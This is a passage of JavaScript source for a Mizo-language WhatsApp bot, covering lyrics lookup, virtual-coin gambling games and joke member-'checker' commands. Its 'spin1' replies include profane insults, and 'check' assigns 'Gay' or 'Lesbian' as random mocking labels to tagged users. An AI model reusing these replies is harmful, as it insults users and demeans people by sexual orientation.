    if (!text) return dodoi(`Eng lyrics nge i zawn dawn?\nTiang hian hman tur: ${prefix + command} Zorema Khiangte Saltang tawngtaina\n\n*Hriattur :* A hla thupui leh a satu hming rawn dah tel ang che, a hla thupui hming i hre lo a nih chuan a chang i hriatna lai rawn dah ang che, ziah dan dikin`)
    var fourbrother = await getBuffer(`https://i.imgur.com/tb7TQAh.jpg`)
    HBWABotMz.sendMessage(from, { react: { text: "🎶" , key: m.key }}) 
    const Parser = require('rss-parser')
    const { htmlToText } = require('html-to-text')
    const parser = new Parser()
    const mizoly = args.join(" ")
    const rssFeedURL = `https://www.mizolyric.com/feeds/posts/default?q=${mizoly}`
    try {
        const feed = await parser.parseURL(rssFeedURL)
        if (feed.items.length === 0) {
            return HBWABotMz.sendMessage(from, { text : `🧐 I lyrics duh *${text}* tih hi ka zawng hmu zo lo. A spelling i ti dik lo a ni maithei..\n\nEmaw He site ah hian a awm lo pawh a ni thei https://www.mizolyric.com/ `}, { quoted: m})
        }
        const jsonArray = [];
        feed.items.forEach(item => {
        const planetext = htmlToText(item.content)
        const textArray = planetext.split("\n")
        const satuIndex = textArray.findIndex(line => line.includes("Satu:"))
        const satuLine = satuIndex !== -1 ? textArray[satuIndex].trim() : "Official";
            const jsonData = {
                link: item.link,
                title: item.title,
                content: htmlToText(item.content),
                asatu: satuLine
            };
            jsonArray.push(jsonData)
        })
        const firstItem = jsonArray[0];
        const alink = firstItem.link;
        const ahlathu = firstItem.title;
        const alyrics = firstItem.content;
        const asatuhming = firstItem.asatu;
        const otherText = asatuhming.replace(/Satu:/g, "'")
        const match = otherText.includes(text)
        const ainmilem = match ? 'lyrics' : `${text}`
        const sazu = `${ahlathu} ${ainmilem}`;
        const res = await yts(sazu)
        const vid = res.videos[0];
        const url = vid.url
        let result;
    try {
        result = await SaveTube(url, "mp3");
        if (!result.status) throw new Error(result.error);
    } catch (error) {
        console.warn("[SaveTube] Failed, amdl ah thlak a ni");

        try {
            result = await amdl.download(url, "mp3");
            if (!result.status) throw new Error(result.result.error);
        } catch (amdlError) {
            return dodoi(`Audio laknaah error a awm:  ${amdlError.message}`);
        }
    }
    const { title, download, format, thumbnail, quality } = result.result;
  await uploadreact()
  const Vawk = await HBWABotMz.sendMessage(m.chat, {audio: { url: download }, mimetype: 'audio/mpeg', ptt: true, 
  contextInfo: {
            externalAdReply: {
              showAdAttribution: true,
              containsAutoReply: true,
              title: `${ahlathu}`,
              body: `Mizo Hla Lyrics`,
              thumbnail: fs.readFileSync('./asset/image/mizolyric.png'),
              mediaType: 1,
              mediaUrl: ``,
              sourceUrl: ``
            }
          }
        }, { quoted: m })
        HBWABotMz.sendMessage(m.chat, { text:`${alyrics}`}, { quoted: Vawk })
    } catch (error) {
        console.error('Dik lo a awm tlat:', error)
    }
}
break;


 
case 'wallet': case 'purse': {
HBWABotMz.sendMessage(from, { react: { text: "🐷" , key: m.key }})
if (m.quoted?.sender) m.mentionedJid.push(m.quoted.sender)
const user = m.sender
const cara = "cara"
const balance = await eco.balance(user, cara)
await dodoi(`🐷 ${pushname} I ${command} ah Coin awm zat:\n\n_🪙 ${balance.wallet}_`)
}
break 
case 'slot': case 'spin': {
if (!m.isGroup) return dodoi(mess.group)
var today = new Date()
if (today.getDay() == 6 || today.getDay() == 5 || today.getDay() == 0){
if (text == 'help') return dodoi(`*1:* ${prefix}Spin tih hi i hmang ang\n\n*2:* I wallet ah cheng 🪙 100 i neih tling tur a ni a,\n\n*3:* Wallet-ah Coin i nei loh chuan i box 📦 a tangin withdraw ang che\n\n*4:* I box 📦-ah pawh Coin i la nei lo cheu a nih chuan i sum hmuhna turin economy features hi hmang rawh`)
if (text == 'Coin') return dodoi(`*1:* Small Win -in 🪙 20 an hlawh anga\n\n*2:* Small Lose in 🪙 20 an chan ang\n\n*3:* Big Win in 🪙 100 an hlawh anga\n\n*4:* Big Lose in 🪙 50 an chan ang\n\n*5:* 🎉 JackPot in 🪙 1000 an dawng bawk ang`)
const fruit1= ["🥥", "🍎", "🍇"]
const fruit2 = ["🍎", "🍇", "🥥"]
const fruit3 = ["🍇", "🥥", "🍎"] 
const fruit4 = ["🍇", "🥥", "🍎"]
const lose = ['*Tun game-ah hi chuan i vanduai tlat mai*\n\n_--> 🍇-🥥-🍎_', '*Line a tangin a chhuak vek*\n\n_--> 🥥-🍎-🍇_', '*Van a duai tlat🌚😂 ti tha leh mai rawh*\n\n_--> 🍎-🍇-🥥_']
const smallLose = ['*Grape pahnih inkawp lohin i spin fuh a ni!!*\n\n_--> 🍇>🥥<🍇_', '*Apple pahnih inkawp lohin i spin fuh a ni!!*\n\n_--> 🍎>🥥<🍎_', '*Coconut pahnih inkawp lohin i spin fih a ni!!*\n\n_--> 🥥>🍎<🥥_']
const won = ['*🤩Nice Apple patum i spin fuh e...*\n\n_--> 🍎+🍎+🍎_', '*Eheuh, Coconut pathum i spin fuh e🤩*\n\n_--> 🥥+🥥+🥥_', '*Ropui lutuk🤩, i chhungte tan Grape juice i siam sak dawn nia*\n\n_--> 🍇+🍇+🍇_'] 
const near = ['*Wow, Grape pahnih leh apple pakhat😂*\n\n_--> 🍎-🍇+🍇_', '*Hehe, Apple pahnih leh Grape pakhat*\n\n_--> 🍎+🍎-🍇_']
const jack = ['*🥳 JackPot 🤑*\n\n_--> 🍇×🍇×🍇×🍇_', '*🎉 JaaackPooot!*\n\n_--> 🥥×🥥×🥥×🥥_', '*🎊I JackPot e 🪙 1000 i dawng e✓*']
const user = m.sender
const cara = "cara"
const k = 100
const balance1= await eco.balance(user, cara)
if (k > balance1.wallet) return dodoi(`I wallet ah 🪙 100 tal i neih a ngai\nI box 📦 a tangin 🪙 100 aia tlemlo withdraw ang che`)
const f1 = fruit1[Math.floor(Math.random() * fruit1.length)];
const f2 = fruit2[Math.floor(Math.random() * fruit2.length)];
const f3 = fruit3[Math.floor(Math.random() * fruit3.length)];
const f4 = fruit4[Math.floor(Math.random() * fruit4.length)];
const mess1 = lose[Math.floor(Math.random() * lose.length)];
const mess2 = won[Math.floor(Math.random() * won.length)];
const mess3 = near[Math.floor(Math.random() * near.length)];
const mess4 = jack[Math.floor(Math.random() * jack.length)];
const mess5 = smallLose[Math.floor(Math.random() * smallLose.length)];
if ((f1 !== f2) && f2 !== f3){
 const deduct1 = await eco.deduct(user, cara, 50)
dodoi(`${mess1}\n\n*Big Lose -->* _🪙 50 i chan_`)
}
else if ((f1 == f2) && f2 == f3){
 const give1 = await eco.give(user, cara, 100) 
 dodoi(`${mess2}\n*_Big Win -->* _🪙 100 i dawng e_`)
}
else if ((f1 == f2) && f2 !== f3){
 const give2 = await eco.give(user, cara, 20)
 dodoi(`${mess3}\n*Small Win -->* _🪙 20 i dawng e_`)
}
else if ((f1 !== f2) && f1 == f3){
 const deduct2 = await eco.deduct(user, cara, 20)
 dodoi(`${mess5}\n\n*Small Lose -->* _🪙 20 i chan_`)
}
else if ((f1 !== f2) && f2 == f3){
 const give4 = eco.give(user, cara, 20) 
 dodoi(`${mess3}\n\n*Small Win -->* _🪙 20 i dawng e_`)
}
else if (((f1 == f2) && f2 == f3) && f3 == f4){
 const give5 = eco.give(user, cara, 1000)
dodoi(`${mess4}\n\n_🎊 JackPot --> _🪙 1000 tawp mai i dawng e🤩_`)
}
else { 
dodoi(`I thil tih hi i hrethiam em ni?`)
}
}
else{
dodoi(`*Kartawpah chauh he game hi i khei thei ang*\n\n*🌿 Zirtawpni*\n*🎏 Inrinni*\n*🎐 Pathianni thleng*`)
}
}
break

case 'box':case 'pikee': {

if (m.quoted?.sender) m.mentionedJid.push(m.quoted.sender)
HBWABotMz.sendMessage(from, { react: { text: "🐷" , key: m.key }})

const user = m.sender
const cara = "cara"
const balance = await eco.balance(user, cara)
await dodoi(`🏦 ${pushname}'I box a Coin awm zat:\n_🪙 ${balance.bank}_\nCoin awm thei zat: _🪙 ${balance.bankCapacity}_`) 
}
break
case 'capacity':case 'boxupgrade': {

HBWABotMz.sendMessage(from, { react: { text: "💲" , key: m.key }})
if (!text) return dodoi(`🐷 Box-Capacity 🐷\n\n1 | 1000 sp = 🪙 100\n\n2 | 10000 sp = 🪙 1000\n\n3 | 100000 sp = 🪙 10000\n\nTiang hian ti la ${prefix}capacity 1 In emaw ${prefix}boxupgrade 1000`)
if (m.quoted?.sender) m.mentionedJid.push(m.quoted.sender)
const user = m.mentionedJid[0] ? m.mentionedJid[0] : m.sender
const cara = "cara"
let value = text.trim()
let k = parseInt(value)
const balance= await eco.balance(user, cara) 
switch (value) {
case '1000':
case '1':
if (k > balance.wallet ) return dodoi(`I box capacity hi 1000-sp ah a pun dawn chuan i wallet ah 🪙 100(za) a awm a ngai`)
const deduct1 = await eco.deduct(user, cara, 100)
const add1 = eco.giveCapacity(user, cara, 1000) 
await dodoi(`${pushname} I box capacity hi 🪙 1000(sangkhat) dah belh theiha upgrade a ni`)
break

case '10000':
case '2':
if (k > balance.wallet ) return dodoi(`I box capacity hi 10000-sp ah a pun dawn chuan i wallet ah 🪙 1000(sangkhat) a awm a ngai`)
const deduct2 = await eco.deduct(user, cara, 1000)
const add2 = eco.giveCapacity(user, cara, 10000) 
await dodoi(`${pushname} i box capacity hi 🪙 10000(singkhat) dah belh theiha upgrade a ni`)
break
 case '100000':
case '3':
if (k > balance.wallet ) return dodoi(`I box capacity hi 100000-sp ah a pun dawn chuan i wallet ah 🪙 10000(singkhat) a awm a ngai`)
const deduct3 = await eco.deduct(user, cara, 10000)
const add3 = eco.giveCapacity(user, cara, 100000) 
await dodoi(`${pushname} i box capacity hi 🪙 100000(nuaikhat) dah belh theiha upgrade a ni`)
}
}
break

case 'deposit':  case 'pay-in': {

HBWABotMz.sendMessage(from, { react: { text: "📥" , key: m.key }})
if (m.quoted?.sender) m.mentionedJid.push(m.quoted.sender)
if (!text) return dodoi("I deposit duh zat rawn provide rawh")
const texts = text.trim()
const user = m.sender;
const cara = "cara"
const deposit = await eco.deposit(user, cara, texts)
if(deposit.noten) return dodoi('I wallet ah chu tiang zat a awm loh avangin i deposit thei lo ang')
dodoi(`I box a 🪙  ${deposit.amount} deposit a ni`)
  }
break
 case 'withdraw':case 'withdrawal': {

HBWABotMz.sendMessage(from, { react: { text: "💸" , key: m.key }})
if (m.quoted?.sender) m.mentionedJid.push(m.quoted.sender)
const user = m.sender
if (!text) return dodoi("I withdraw duh zat rawn provide rawh!")
const query = text.trim()
const cara = "cara"
const withdraw = await eco.withdraw(user, cara, query)
if(withdraw.noten) return dodoi('Chutiang zat zat i box ah Coin i nei lo')
const add = eco.give(user, cara, query)
dodoi(`🏧 ALERT I wallet a 🪙 ${withdraw.amount} dah a ni.`)
}
break 
case 'transfer': {
    HBWABotMz.sendMessage(from, { react: { text: "🗿", key: m.key } });
    let value = text.trim().split(" ");
    if (value[0] === "") return dodoi(`Tiang hian ti rawh : ${prefix}transfer 100 @user`);
    const target = m.quoted && m.mentionedJid.length === 0
        ? m.quoted.sender
        : m.mentionedJid[0] || null;
    if (!target || target === m.sender) return dodoi("Engtia tih nge i tum");
    if (m.quoted?.sender && !m.mentionedJid.includes(m.quoted.sender)) m.mentionedJid.push(m.quoted.sender);
    while (m.mentionedJid.length < 2) m.mentionedJid.push(m.sender);
    const cara = "cara"; // Currency type
    const user1 = m.sender; // Sender
    const user2 = target;  // Recipient
    const word = value[0]; // Points to transfer
    let d = parseInt(word); // Convert to number
    if (!d) return dodoi("I thil ziah khi check teh, command i hmang dik lo a ni mai thei"); // Validate input
    const balance = await eco.balance(user1, cara); // Get user1's balance
    if (balance.wallet < d) return dodoi("Chutiang zat transfer turin i wallet ah a awm lo"); // Insufficient balance
    let deduction = Math.floor(d * 0.2); // Deduct 20%
    let finalAmount = d - deduction;
    const deduct = await eco.deduct(user1, cara, d);
    const give = await eco.give(user2, cara, finalAmount);
dodoi(`*${d}* Coin chu pek fel a ni,
Transfer command hman man *${d}* atangin *20%* cut tel a ni!😇
Final transfer amount: *${finalAmount}*`);
}
break;
case 'cut':{
if (!HerbertTheCreator1) return
HBWABotMz.sendMessage(from, { react: { text: "🫡" , key: m.key }})
let value = text.trim().split(" ")
if (value[0] === "") return
const target =
m.quoted && m.mentionedJid.length === 0
? m.quoted.sender
: m.mentionedJid[0] || null;
if (m.quoted?.sender && !m.mentionedJid.includes(m.quoted.sender)) m.mentionedJid.push(m.quoted.sender)
while (m.mentionedJid.length < 2) m.mentionedJid.push(m.sender)
const cara = "cara"
const hmela = target
const paihsakna = await eco.deduct(hmela, cara, value[0])
const balance = await eco.balance(hmela, cara)
await dodoi(`🫡Sir, hei zawng hi a la bang : _🪙 ${balance.wallet}_\nI la cut leh dawn em sir ?🙋‍♂️`)
}
break

case 'cut5':{
if (!HerbertTheCreator1) return
HBWABotMz.sendMessage(from, { react: { text: "🫡" , key: m.key }})
let value = text.trim().split(" ")
if (value[0] === "") return
const target =
m.quoted && m.mentionedJid.length === 0
? m.quoted.sender
: m.mentionedJid[0] || null;
if (m.quoted?.sender && !m.mentionedJid.includes(m.quoted.sender)) m.mentionedJid.push(m.quoted.sender)
while (m.mentionedJid.length < 2) m.mentionedJid.push(m.sender)
const cara = "title"
const hmela = target
const paihsakna = await eco.deduct(hmela, cara, value[0])
const balance = await eco.balance(hmela, cara)
await dodoi(`🫡Sir, hei zawng hi a la bang : _🪙 ${balance.wallet}_\nI la cut leh dawn em sir ?🙋‍♂️`)
}
break
case 'cut2': {

if (!HerbertTheCreator1) return
HBWABotMz.sendMessage(from, { react: { text: "🫡" , key: m.key }})
let value = text.trim().split(" ")
if (value[0] === "") return
const target =
m.quoted && m.mentionedJid.length === 0
? m.quoted.sender
: m.mentionedJid[0] || null;
if (m.quoted?.sender && !m.mentionedJid.includes(m.quoted.sender)) m.mentionedJid.push(m.quoted.sender)
while (m.mentionedJid.length < 2) m.mentionedJid.push(m.sender)
const cara = "cara"
const hmela = target
const withdraw = await eco.withdraw(hmela, cara, value[0])
if(withdraw.noten) return dodoi('Chutiang zat zat a box ah Coin a nei lo')
const paihsakna = await eco.deduct(hmela, cara, value[0])
const balance = await eco.balance(hmela, cara)
await dodoi(`🫡Sir, hei zawng hi a la bang : _🪙 ${balance.bank}_\nI la cut leh dawn em sir?🙋‍♂️`)
}
break
case 'c2': {

if (m.quoted?.sender) m.mentionedJid.push(m.quoted.sender)
if (!HerbertTheCreator1) return
HBWABotMz.sendMessage(from, { react: { text: "🫡" , key: m.key }})
let value = text.trim().split(" ")
if (value[0] === "") return
const target =
m.quoted && m.mentionedJid.length === 0
? m.quoted.sender
: m.mentionedJid[0] || null;
if (m.quoted?.sender && !m.mentionedJid.includes(m.quoted.sender)) m.mentionedJid.push(m.quoted.sender)
while (m.mentionedJid.length < 2) m.mentionedJid.push(m.sender)
const hmeli = target
const cara = "cara"
const balance = await eco.balance(hmeli, cara)
await dodoi(`🫡Sir a wallet-ah hei zat hi a awm : _🪙 ${balance.wallet}_ 🤔`)
}
break 
case 'c3': {

if (m.quoted?.sender) m.mentionedJid.push(m.quoted.sender)
if (!HerbertTheCreator1) return
HBWABotMz.sendMessage(from, { react: { text: "🫡" , key: m.key }})
let value = text.trim().split(" ")
if (value[0] === "") return
const target =
m.quoted && m.mentionedJid.length === 0
? m.quoted.sender
: m.mentionedJid[0] || null;
if (m.quoted?.sender && !m.mentionedJid.includes(m.quoted.sender)) m.mentionedJid.push(m.quoted.sender)
while (m.mentionedJid.length < 2) m.mentionedJid.push(m.sender)
const hmeli = target
const cara = "cara"
const balance = await eco.balance(hmeli, cara)
await dodoi(`🫡Sir a box-ah hei zat hi a awm:  _🪙 ${balance.bank}_ 🤔`)
}
break 
case 'gamble':case 'lottery': {
HBWABotMz.sendMessage(from, { react: { text: "🤪" , key: m.key }})
var texts = text.trim().split(" ")
var opp = texts[1];
var value = texts[0].toLowerCase()
var gg = parseInt(value)
const user = m.sender
const cara = "cara"
const balance = await eco.balance(user, cara) 
const g = (balance.wallet) > parseInt(value)
const k = 50
const a = (k) > parseInt(value)
const twice = gg*2
const f = ["up", "right", "left", "down", "up", "left", "down", "right", "up", "down", "right", "left"]
const r = f[Math.floor(Math.random () * f.length)]
 if (texts[0] === "")
 return dodoi(
 `Tiang hian tih tur:${prefix}gamble 100 direction(left,right,up,down)`
 )
 if (!value) return dodoi("*I gamble zat tur rawn tarlang rawh!")
 if (!opp) return dodoi("I bet tur direction kha rawn dah rawh")
 if (!gg) return dodoi("I thil ziah khi check tha rawh, command dik lo i hmang a ni mai thei")
 if (m.quoted?.sender) m.mentionedJid.push(m.quoted.sender)
 if (g == false) return dodoi(`Chutiang zat gamble turin i Coin neihin a daih lo`)
 if (a == true) return dodoi(`Sorry ${pushname}, 🪙 50 aia tlem chuan a gamble thei lo`)
 if ( r == opp){
let give = await eco.give(user , cara, twice)
dodoi(`*🪙 ${twice} i dawng e✓*`)
 }
 else{
let deduct = await eco.deduct(user, cara, texts[0])
dodoi(`*🪙 ${texts[0]} i chan(loss) a ni*`)
}
}
break

case 'guess': {
  HBWABotMz.sendMessage(from, { react: { text: "🔢", key: m.key } });

  const [amountText, guessText] = text.trim().split(" ");
  const amount = parseInt(amountText);
  const guess = parseInt(guessText);
  const user = m.sender;
  const cara = "cara";
  const minBet = 50;

  if (!amount || !guess) return dodoi(`Tiang hian hman tur\n*Entirnan:* ${prefix}guess <amount> <number(1-5)>`);
  if (isNaN(amount) || isNaN(guess) || guess < 1 || guess > 5) return dodoi("Number i pick dik lo, 1 atanga 5 thleng pick tur a awm");
  
  const balance = await eco.balance(user, cara);
  if (amount < minBet) return dodoi(`${minBet} Aia tlem bet thei a ni lo`);
  if (balance.wallet < amount) return dodoi("Chutiang zat bet tur i nei lo.");

  const random = Math.floor(Math.random() * 5) + 1;

  if (guess === random) {
    const prize = amount * 5;
    await eco.give(user, cara, prize);
    dodoi(`🎉 I number pick ${random} chu a dik e, 🪙 ${prize} i dawng e`);
  } else {
    await eco.deduct(user, cara, amount);
    dodoi(`😢 I number pick  ${random}. a dik lo tlat, 🪙 ${amount} i chan e`);
  }
}
break;

case 'color': {
  HBWABotMz.sendMessage(from, { react: { text: "🎨", key: m.key } });
  const [amountText, colorText] = text.trim().toLowerCase().split(" ");
  const amount = parseInt(amountText);
  const color = colorText;
  const user = m.sender;
  const cara = "cara";
  const minBet = 50;
  if (!amount || !color) return dodoi(`Tiang hian hman tur\n*Entirnan:* ${prefix}color <amount> <asen|adum|avar>`);
  if (isNaN(amount)) return dodoi("❌ Amount i dah dik lo.");
  if (!["asen", "adum", "avar"].includes(color)) return dodoi("Colour i thlang dik lo, hengte chauh hi thlan tur a ni [ Asen/Adum/Avar");

  const balance = await eco.balance(user, cara);
  if (amount < minBet) return dodoi(`🧾 Minimum bet is ${minBet}.`);
  if (balance.wallet < amount) return dodoi("💰 Not enough coins.");

  const number = Math.floor(Math.random() * 11); // 0-10

  let resultColor = number === 0 ? 'avar' : (number % 2 === 0 ? 'asen' : 'adum');
  let reply = `🎲 Number: *${number}* (${resultColor.toUpperCase()})\n`;

  if (color === resultColor) {
    const multiplier = color === 'avar' ? 5 : 2;
    const win = amount * multiplier;
    await eco.give(user, cara, win);
    reply += `🎉 *${color}* i thlanga, a dik. 🪙 *${win}* i dawng e!`;
  } else {
    await eco.deduct(user, cara, amount);
    reply += `😢 *${color}* i thlanga a dik lo, 🪙 *${amount}* i chan e!`;
  }

  dodoi(reply);
}
break;

case 'hmelchhe': case 'damrei': case 'dawih': case 'mawl': case 'a': case 'fing': case 'hrisel': case 'upa': case 'naupang': case 'hmeltha': case 'lulian': case 'zaktheilo': case 'zakzum': case 'nawi': case 'tawngthei': case 'mifel': case 'chawheh': case 'bumhmang': case 'lerh': case 'luck': case 'zei': case 'hur': case 'dum': case 'ngo': case 'sual': case 'misual': {

if (!m.isGroup) return
const lonuirawh = await getBuffer(`https://raw.githubusercontent.com/HBMods-OFC/Vawk/master/Media/fun.jpg`)
let member = participants.map(u => u.id)
let berr = member[Math.floor(Math.random() * member.length)]
if (text == 'ber') return await HBWABotMz.sendMessage(m.chat,
{ text: `Kan group-a ${command} ber chu @${berr.split('@')[0]} hi a ni👀😂`,
contextInfo:{
mentionedJid:[berr],
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": `Fun Game`,
"body": `Ber features👀😂`,
"thumbnailUrl": ``,
"thumbnail": lonuirawh,
"sourceUrl": `https://youtube.com/@HBMods_Channel`}}},
{ quoted: m})        
            }
            break

case 'checkme':
try {
userPfp = await HBWABotMz.profilePictureUrl(m.sender, "image")
} catch (e) {
userPfp = defaultpp
}
					neme = args.join(" ")
					bet = `${sender}`
					var mizia = ['Mi pangngai tak','Kawm harsa','Chapo deuh','Mifel tak','Nawi deuh','Mi inngaitlawm thei tak','Mi Thinchhia','Polite deuh','Kawm nuam','Mi bum hmang','Tahbelh','Hrilh chawp ngai reng']
					var hobby1 = ['Ei rawng bawl','Lâm 💃','In fiam','Gamers','Lem ziak','Midangte tanpui','Anime en mai mai','Lehkha chhiar','Ride mai mai','Zai','Tlai','Fiamthu thawh','Lem ziak','Thil ei reng','Truth or Dare khel mai mai','Mahnia awm mai mai']
					var hmelhmang = ['Umm','Aih','Hmel chhe lutuk','Hmel tha lutuk']
					var thiltihthat = ['Lerh lo','Lerh e','Lerh lutuk','Lerh ve tho','Lerh vak lo']
					var thiltihchhiat = [,'4','4.1','4.2','4.3','4.4','4.5','4.6','4.7','4.8','4.9','5','5.1','5.2','5.3','5.4','5.5','5.6','5.7','5.7','5.8','5.9','6']
					var findan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36']
					var dawih = ['A nei','A nei lo']
					var mizia1 = mizia[Math.floor(Math.random() * mizia.length)]
					var hobby = hobby1[Math.floor(Math.random() * hobby1.length)]
					var hmelhmang1 = hmelhmang[Math.floor(Math.random() * hmelhmang.length)]
					var thiltihthat1 = thiltihthat[Math.floor(Math.random() * thiltihthat.length)]
					var thiltihchhiat1 = thiltihchhiat[Math.floor(Math.random() * thiltihchhiat.length)]
					var findan1 = findan[Math.floor(Math.random() * findan.length)]
					var dawih1 = dawih[Math.floor(Math.random() * dawih.length)]
let profile = `*≡══《 Check @${bet.split('@')[0]} 》══≡*

*Hming :* ${pushname}
*Mizia :* ${mizia1}
*Hobby :* ${hobby}
*Hmeltha em? :* ${hmelhmang1}
*Lerh em? :* ${thiltihthat1}
*San zawng :* ${thiltihchhiat1}fit
*Ex neihzat :* ${findan1}
*Ngaihzawng :* ${dawih1}
*VIP Member :* ❌ i ni lo
*≡═══《 CHECK PROPERTIES 》═══≡*`
let profile2 = `*≡══《 Check @${bet.split('@')[0]} 》══≡*

*Hming :* ${pushname}
*Mizia :* ${mizia1}
*Hobby :* ${hobby}
*Hmeltha em? :* ${hmelhmang1}
*Lerh em? :* ${thiltihthat1}
*San zawng :* ${thiltihchhiat1}fit
*Ex neihzat :* ${findan1}
*Ngaihzawng :* ${dawih1}
*VIP Member :* ✅ i ni
*≡═══《 CHECK PROPERTIES 》═══≡*`
const buff = await getBuffer(userPfp)
if (!isVip) return HBWABotMz.sendMessage(from, { image: buff, caption: profile, mentions: [bet]},{quoted:m})
HBWABotMz.sendMessage(from, { image: buff, caption: profile2, mentions: [bet]},{quoted:m})
break
case 'dpdl':{
const target =
m.quoted && m.mentionedJid.length === 0
? m.quoted.sender
: m.mentionedJid[0] || null;
if (m.quoted?.sender && !m.mentionedJid.includes(m.quoted.sender)) m.mentionedJid.push(m.quoted.sender)
while (m.mentionedJid.length < 2) m.mentionedJid.push(m.sender)
try {
userPfp = await HBWABotMz.profilePictureUrl(target, "image")
} catch (e) {
userPfp = defaultpp
}
const buff = await getBuffer(userPfp)
HBWABotMz.sendMessage(from, { image: buff},{quoted:m})
}
break
case 'ping': case 'p': {
var ping = ['84','68','74','99','129','130','150','280','320','380','380','163','163','84','64','74','999','827','266','979','768','562','626','737','166']
var pong = ping[Math.floor(Math.random() * ping.length)]
HBWABotMz.sendMessage(from, {text: `_*Pong*_ ${pong} _*ms...*_`},{quoted:m})
}
break
case 'tos': {
let msg = generateWAMessageFromContent(from, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2,
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: '',
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: 'HBWABot Mizo',
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        title: `${mtl2.tos}`,
                        subtitle: '',
                        hasMediaAttachment: false,
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                name: "single_select",
                                buttonParamsJson: JSON.stringify({
                                    title: `${mtl2.tosq}`,
                                    sections: [
                                        {
                                            title: `${mtl2.tosq}`,
                                            rows: [
                                                {
                                                    title: "In terms of service hi",
                                                    description: `agree`,
                                                    id: `${prefix}` + `pawme/`
                                                },
                                                {
                                                    title: "In terms of service hi",
                                                    description: `Skip`,
                                                    id: `pawmlo/`
                                                }
                                            ]
                                        }
                                    ]
                                })
                            }
                        ]
                    }),
                    contextInfo: {
                        mentionedJid: [m.sender],
                        forwardingScore: 1,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: '120363191549232941@newsletter',
                            newsletterName: "Terms of Service",
                            serverMessageId: 145,
                        }
                    }
                })
            }
        }
    }, { quoted: m });

    // Relay the message using HBWABotMz
    HBWABotMz.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id,
    });
}
break
case 'spin1':{
var ping = ['I hmel chhe lutuk','Vawk i ang','I van hmel tha em em🤭🥰','I lu lian','I hur','Kiri','','I rawn spin1 ve mi 🤣','🤣 Blehh...','Muah🥰','Fuck you 🖕','Hello Mother Fucker🤖','A ho','Hello 🌚','Mawla','Mawli','U r gay 🖕','Min nei duh em?','Happy Birthday 🥳','🙄Eng mah awm lo','Hmeichhia a mi nih?','🤣','😆','🤦','Reels ve tawh suh']
var pong = ping[Math.floor(Math.random() * ping.length)]
var dbinaryloading = [
`《▒▒▒▒▒▒▒▒▒▒▒▒》0%`,
`《█▒▒▒▒▒▒▒▒▒▒▒》10%`,
`《████▒▒▒▒▒▒▒▒》30%`,
`《███████▒▒▒▒▒》50%`,
`《██████████▒▒》80%`,
`《████████████》100%`,
`${pong}`]

let { key } = await HBWABotMz.sendMessage(from, {text: '《▒▒▒▒▒▒▒▒▒▒▒▒》0%\n♻️ _Nghak lawk rawh.._'},{quoted:m})

for (let i = 0; i < dbinaryloading.length; i++) {await HBWABotMz.sendMessage(from, {text: dbinaryloading[i], edit: key },{quoted:m})}
}
break
case 'check': {

if (!m.isGroup) return dodoi(mess.group)
if (!m.mentionedJid[0]) return dodoi(`_Tu nge check i duh, I check duh chu tag rawh.._\nTiang hian : ${prefix}check @${owner}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
neme = args.join(" ")
const lonuirawh = await getBuffer(`https://raw.githubusercontent.com/HBMods-OFC/Vawk/master/Media/fun.jpg`)
bet = `${m.mentionedJid[0]}`
var mizia = ['Mi pangngai tak','Kawm harsa tak','Chapo deuh', 'Gay', 'Lesbian', 'Mifel tak','Nawi deuh','Mi inngaitlawm thei tak','Mi Thinchhe tak','Polite deuh','Kawm nuam','Mi bum hmang','Tahbelh','Hrilh chawp ngai reng','Mi hur awmngaihna hrelo', ]
					var hobby1 = ['Ei rawng bawl','Lâm 💃','In fiam','Gamers','Lem ziak','Midangte tanpui','Mi rel','Lehkha chhiar','Ride mai mai','Zai','Tlai','Fiamthu thawh','Lem ziak','Thil ei reng','Mi bum','Mahnia awm mai mai']
					var hmelhmang = ['Umm','Aih','Hmel chhe lutuk','Hmel tha lutuk']
					var thiltihthat = ['Lerh lo','Lerh e','Lerh lutuk','Lerh ve tho','Lerh vak lo']
					var thiltihchhiat = [,'4','4.1','4.2','4.3','4.4','4.5','4.6','4.7','4.8','4.9','5','5.1','5.2','5.3','5.4','5.5','5.6','5.7','5.7','5.8','5.9','6']
					var findan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36']
					var dawih = ['A nei','A nei lo']
					var mizia1 = mizia[Math.floor(Math.random() * mizia.length)]
					var hobby = hobby1[Math.floor(Math.random() * hobby1.length)]
					var hmelhmang1 = hmelhmang[Math.floor(Math.random() * hmelhmang.length)]
					var thiltihthat1 = thiltihthat[Math.floor(Math.random() * thiltihthat.length)]
					var thiltihchhiat1 = thiltihchhiat[Math.floor(Math.random() * thiltihchhiat.length)]
					var findan1 = findan[Math.floor(Math.random() * findan.length)]
					var dawih1 = dawih[Math.floor(Math.random() * dawih.length)]
					var avipem = checkVipUser(bet, vipmem)//
					const avipe = avipem ? 'a ni ✓' : 'a ni lo';
let aihviplo = `*≡══《 Check @${bet.split('@')[0]} 》══≡*

*A Hming :* @${bet.split('@')[0]}
*A mah hi :* ${mizia1} a ni
*A Hobby :* ${hobby}
*A Hmeltha em? :* ${hmelhmang1}
*A Lerh em? :* ${thiltihthat1}
*A San zawng :* ${thiltihchhiat1}fit
*A Ex neihzat :* ${findan1}
*Ngaihzawng :* ${dawih1}
*VIP Member :* ${avipe}
*≡═══《 CHECK PROPERTIES 》═══≡*`
HBWABotMz.sendMessage(m.chat,{ text: aihviplo,contextInfo:{
mentionedJid:[bet],
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": `Fun Game`,
"body": `Checker👀😂`,
"thumbnailUrl": ``,
"thumbnail": lonuirawh,
